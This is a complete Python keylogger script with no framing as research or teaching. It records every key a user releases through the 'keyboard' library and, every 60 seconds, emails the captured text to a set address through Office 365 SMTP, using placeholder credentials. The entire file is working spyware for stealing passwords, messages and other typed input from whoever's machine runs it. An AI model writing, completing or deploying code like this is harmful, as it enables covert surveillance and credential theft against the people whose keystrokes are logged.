import keyboard, smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 #seconds
EMAIL_ADDRESS = "example@mail.com"
EMAIL_PASSWORD = "password"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        
        self.interval = interval
        self.report_method = report_method

        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):

        name = event.name
        
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def prepare_email(self, message):

        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")

        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()
    
    def send_email(self, email, password, message):

        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_email(message))
        server.quit()

    def report(self):

        if self.log:
            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        
        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):

        self.start_dt = datetime.now()

        keyboard.on_release(callback=self.callback)
        self.report()

        keyboard.wait()

if __name__ == "__main__":
    
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()
